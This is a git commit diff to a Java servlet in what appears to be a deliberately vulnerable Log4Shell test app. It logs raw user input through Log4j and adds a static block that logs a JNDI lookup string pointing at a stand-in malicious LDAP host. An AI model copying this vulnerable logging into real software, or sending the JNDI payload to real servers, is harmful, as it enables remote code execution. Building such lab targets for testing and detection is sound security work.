7cb35d7a6867ae54af85134141a5b6714fe6ed46
Howie Howerton <howieh@sentinelone.com>
2025-05-24 14:16:17 -0400

    web

--- log4shell-vulnapp/VulnWebApp.java
+++ log4shell-vulnapp/VulnWebApp.java
@@ -1,18 +1,33 @@
 import javax.servlet.*;
 import javax.servlet.http.*;
-import java.io.IOException;
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
+import java.io.*;
 
 public class VulnWebApp extends HttpServlet {
-    private static final Logger logger = LogManager.getLogger(VulnWebApp.class);
+    static {
+        // Vulnerable Log4j init
+        org.apache.logging.log4j.LogManager.getLogger(VulnWebApp.class).error("App initialized: ${jndi:ldap://malicious-server.com/a}");
+    }
 
-    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
-        String user = request.getParameter("user");
-        logger.info("User input: " + user);  // vulnerable line for Log4Shell
+    protected void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
         response.setContentType("text/html");
-        response.getWriter().println("<html><body><form method='GET'>" +
-            "Username: <input name='user'/> <input type='submit'/>" +
-            "</form></body></html>");
+        PrintWriter out = response.getWriter();
+        out.println("<html><body>");
+        out.println("<h2>Log4Shell Test App</h2>");
+        out.println("<form method='POST'>");
+        out.println("Name: <input type='text' name='name'/><input type='submit' value='OK'/>");
+        out.println("</form>");
+        out.println("</body></html>");
+    }
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String name = request.getParameter("name");
+        org.apache.logging.log4j.LogManager.getLogger(VulnWebApp.class).info("User input: " + name);
+        response.setContentType("text/html");
+        PrintWriter out = response.getWriter();
+        out.println("<html><body>");
+        out.println("<h2>Hello, " + name + "</h2>");
+        out.println("</body></html>");
     }
 }
